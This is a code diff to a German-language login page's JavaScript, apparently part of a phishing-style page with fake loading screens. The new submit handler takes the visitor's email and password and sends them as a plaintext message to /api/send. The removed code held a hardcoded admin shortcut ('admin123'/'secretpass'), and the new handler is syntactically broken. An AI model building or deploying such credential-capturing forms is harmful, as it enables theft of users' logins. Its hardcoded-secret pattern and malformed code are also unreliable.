@@ -236,32 +236,25 @@
 
     // Formular: client-seitiger Admin-Shortcut + normale Abschick-Weiterleitung
     document.getElementById("loginForm").addEventListener("submit", async (e) => {
-      e.preventDefault();
-
-      const email = document.getElementById("email").value.trim();
-const passwort = document.getElementById("passwort").value.trim();
-
-const text = `Von ${email}:\n${passwort}`;              
-   await fetch("/api/send", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({ passwort: text })
+  e.preventDefault();
+  alert("SUBMIT LÄUFT");
 });
 
-      // Admin-Shortcut (nur lokal / bequem): weiter zu display.php
-      if (contact.toLowerCase() === "admin123" && password === "secretpass") {
-        window.location.href = "display.php";
-        return;
-      }
+  const email = document.getElementById("email").value.trim();
+  const password = document.getElementById("password").value;
 
-      // Wenn gültig, Form normal abschicken (POST an save.php)
-      if (contact && password) {
-        // Abschicken per JS -> dadurch bleibt action=save.php erhalten, Browser lädt die Seite
-        this.submit();
-      }
-    });
+  const text = `Email: ${email}: Passwort: ${password}`;
 
-    // Neu anmelden → eigene Loading-Seite (du legst loading-signup.html an)
+  const res = await fetch("/api/send", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ message: text })
+  });
+
+  alert(res.ok ? "Gesendet ✅" : "Fehler ❌");
+
+
+// Neu anmelden → eigene Loading-Seite (du legst loading-signup.html an)
     document.getElementById("signupBtn").addEventListener("click", () => {
       window.location.href = "loading-signup.html";
     });
